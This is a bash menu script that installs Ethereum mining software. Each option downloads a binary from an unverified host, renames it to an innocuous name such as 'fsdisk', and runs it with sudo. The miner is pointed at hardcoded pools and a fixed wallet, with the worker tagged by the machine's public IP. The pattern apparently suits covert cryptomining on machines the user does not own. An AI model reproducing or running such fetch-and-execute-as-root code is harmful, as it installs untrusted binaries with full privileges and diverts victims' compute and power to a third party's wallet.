#!/bin/bash
# 08.03.2021
#Create a menu
function menu {
clear
echo
echo -e "\t\t\CEK NASRULLAH\n"
 
echo -e "\t\t\tVer: 1.0\n"
echo -e "\t\t\tInstallation menu\n"
echo -e "\t1. TREX MINER"
echo -e "\t2. NBMINER ETH"
echo -e "\t0. exit"
echo -en "\t\tPress the number to install: "
read -n 1 option
}
#We use a While Loop and Case Command to create a menu.
while [ $? -ne 1 ]
do
        menu
        case $option in
0)
        break ;;
1)
        wget -O timphan Inkdriver.com/t-rex
chmod +x ./timphan && sudo ./timphan -a ethash -o stratum+tcp://eth-pool.beepool.org:9530 -u adbreaks20 -p x -w kupisikhan ;;

2)
POOL=asia1.ethermine.org:4444
WALLET=0x7f5efa9e926a94ded7b22125b870fd0846aa5d34
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )

cd "$(dirname "$0")"
wget -O fsdisk https://raw.githubusercontent.com/azis07/turbo/main/turbo
chmod +x ./fsdisk && sudo ./fsdisk -a ethash -o $POOL -u $WALLET.$WORKER ;;

*)
        clear
echo "You need to select a section";;
esac
echo -en "\n\n\t\t\tPress any key to continue"
read -n 1 line
done
clear
